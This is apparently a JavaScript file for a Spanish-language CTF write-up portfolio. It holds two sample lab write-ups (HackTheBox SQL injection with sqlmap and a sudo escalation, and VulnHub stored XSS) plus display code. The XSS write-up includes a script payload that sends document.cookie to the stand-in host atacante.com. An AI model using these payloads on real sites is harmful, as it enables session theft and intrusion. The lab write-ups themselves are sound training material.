// Datos de ejemplo
const writeupsData = [
    {
        title: "Writeup - VM Ejemplo: Banky",
        date: "2025-10-01",
        platform: "HackTheBox",
        difficulty: "medio",
        tags: ["web", "sql-injection", "nmap", "gobuster"],
        slug: "banky-hackthebox",
        hours_spent: 5,
        content: `# Writeup - VM Ejemplo: Banky

**Fecha:** 2025-10-01 • **Plataforma:** HackTheBox • **Dificultad:** medio • **Horas:** 5

## TL;DR
Explotación de SQL injection para obtener acceso administrativo y posterior escalada de privilegios mediante vulnerabilidad de sudo.

## Entorno
VM local de HackTheBox. **REDACTADO** cualquier IP real o credencial.

## Reconocimiento
\`\`\`bash
nmap -sC -sV 10.10.10.100
\`\`\`
\`\`\`text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
\`\`\`

## Enumeración
\`\`\`bash
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
\`\`\`
Se descubrió panel de login en /admin.

## Explotación (laboratorio)
Uso de sqlmap para identificar y explotar vulnerabilidad SQLi:
\`\`\`bash
sqlmap -u "http://10.10.10.100/login.php" --data="username=admin&password=test" --dbs
\`\`\`
Se extrajeron credenciales de la base de datos.

## Post-explotación
Obtención de shell reverso y escalada mediante vulnerabilidad de sudo:
\`\`\`bash
sudo -l
sudo /usr/bin/python3 /opt/scripts/backup.py
\`\`\`

## Limpieza y mitigaciones
- Validación de entrada en formularios
- Uso de prepared statements
- Actualización del sistema
- Restricción de permisos sudo

## Lecciones aprendidas
Importancia de la validación de entrada y el principio de mínimo privilegio. Referencia: OWASP SQL Injection Prevention Cheat Sheet.`
    },
    {
        title: "Writeup - VM Ejemplo: VulnHub Basic",
        date: "2025-09-15",
        platform: "VulnHub",
        difficulty: "fácil",
        tags: ["web", "xss", "gobuster", "nmap"],
        slug: "vulnhub-basic",
        hours_spent: 3,
        content: `# Writeup - VM Ejemplo: VulnHub Basic

**Fecha:** 2025-09-15 • **Plataforma:** VulnHub • **Dificultad:** fácil • **Horas:** 3

## TL;DR
Explotación de XSS almacenado para robo de cookies y acceso administrativo.

## Entorno
VM local de VulnHub. **REDACTADO** cualquier IP real o credencial.

## Reconocimiento
\`\`\`bash
nmap -sV 192.168.1.100
\`\`\`
\`\`\`text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
\`\`\`

## Enumeración
Gobuster para descubrir directorios:
\`\`\`bash
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
\`\`\`
\`\`\`text
/admin                (Status: 200)
/comments             (Status: 200)
/uploads              (Status: 200)
\`\`\`

## Explotación (laboratorio)
Inyección de script malicioso en campo de comentarios:
\`\`\`javascript
<script>document.location='http://atacante.com/steal?cookie='+document.cookie</script>
\`\`\`

## Post-explotación
Uso de cookies robadas para acceso administrativo.

## Limpieza y mitigaciones
- Sanitización de entrada de usuario
- Uso de Content Security Policy
- HttpOnly en cookies

## Lecciones aprendidas
Importancia de la sanitización de entrada y políticas de seguridad de contenido.`
    }
];

// Cargar datos desde localStorage o usar datos de ejemplo
function loadWriteups() {
    try {
        const stored = localStorage.getItem('cybersecurity-writeups');
        return stored ? JSON.parse(stored) : writeupsData;
    } catch (error) {
        console.error('Error loading writeups:', error);
        return writeupsData;
    }
}

// Guardar datos en localStorage
function saveWriteups(writeups) {
    try {
        localStorage.setItem('cybersecurity-writeups', JSON.stringify(writeups));
        return true;
    } catch (error) {
        console.error('Error saving writeups:', error);
        return false;
    }
}

// Función para mostrar estadísticas en la página principal
function displayStats() {
    const writeups = loadWriteups();
    
    // Total máquinas
    const totalElement = document.getElementById('total-machines');
    if (totalElement) {
        totalElement.textContent = writeups.length;
    }
    
    // Estadísticas por plataforma
    const platformStats = {};
    writeups.forEach(writeup => {
        platformStats[writeup.platform] = (platformStats[writeup.platform] || 0) + 1;
    });
    
    const platformStatsElement = document.getElementById('platform-stats');
    if (platformStatsElement) {
        platformStatsElement.innerHTML = '';
        for (const [platform, count] of Object.entries(platformStats)) {
            const platformElement = document.createElement('div');
            platformElement.textContent = `${platform}: ${count}`;
            platformStatsElement.appendChild(platformElement);
        }
    }
    
    // Estadísticas por dificultad
    const difficultyStats = {};
    writeups.forEach(writeup => {
        difficultyStats[writeup.difficulty] = (difficultyStats[writeup.difficulty] || 0) + 1;
    });
    
    const difficultyStatsElement = document.getElementById('difficulty-stats');
    if (difficultyStatsElement) {
        difficultyStatsElement.innerHTML = '';
        for (const [difficulty, count] of Object.entries(difficultyStats)) {
            const difficultyElement = document.createElement('div');
            difficultyElement.textContent = `${difficulty}: ${count}`;
            difficultyStatsElement.appendChild(difficultyElement);
        }
    }
}

// Función para mostrar write-ups recientes
function displayRecentWriteups() {
    const writeups = loadWriteups();
    const recentWriteups = writeups.slice(0, 3); // Mostrar los 3 más recientes
    
    const container = document.getElementById('recent-writeups-list');
    if (container) {
        container.innerHTML = '';
        
        if (recentWriteups.length === 0) {
            container.innerHTML = '<p>No hay write-ups recientes.</p>';
            return;
        }
        
        recentWriteups.forEach(writeup => {
            const writeupElement = document.createElement('div');
            writeupElement.className = 'writeup-card';
            writeupElement.innerHTML = `
                <div class="writeup-header">
                    <div>
                        <h3 class="writeup-title">${writeup.title}</h3>
                        <div class="writeup-meta">
                            <span class="writeup-platform">${writeup.platform}</span>
                            <span class="writeup-difficulty difficulty-${writeup.difficulty}">${writeup.difficulty}</span>
                            <span>${writeup.date} • ${writeup.hours_spent}h</span>
                        </div>
                    </div>
                </div>
                <div class="writeup-tags">
                    ${writeup.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
                </div>
                <a href="writeup-view.html?slug=${writeup.slug}" class="btn">Ver Write-up</a>
            `;
            container.appendChild(writeupElement);
        });
    }
}

// Inicializar página principal
if (window.location.pathname.endsWith('index.html') || window.location.pathname === '/' || window.location.pathname.endsWith('/')) {
    document.addEventListener('DOMContentLoaded', function() {
        displayStats();
        displayRecentWriteups();
    });
}

// Inicializar dashboard
if (window.location.pathname.includes('dashboard.html')) {
    document.addEventListener('DOMContentLoaded', function() {
        // Las funciones del dashboard se cargan desde dashboard.js
        console.log('Dashboard loaded');
    });
}

// Hacer funciones disponibles globalmente
window.loadWriteups = loadWriteups;
window.saveWriteups = saveWriteups;
window.displayStats = displayStats;
window.displayRecentWriteups = displayRecentWriteups;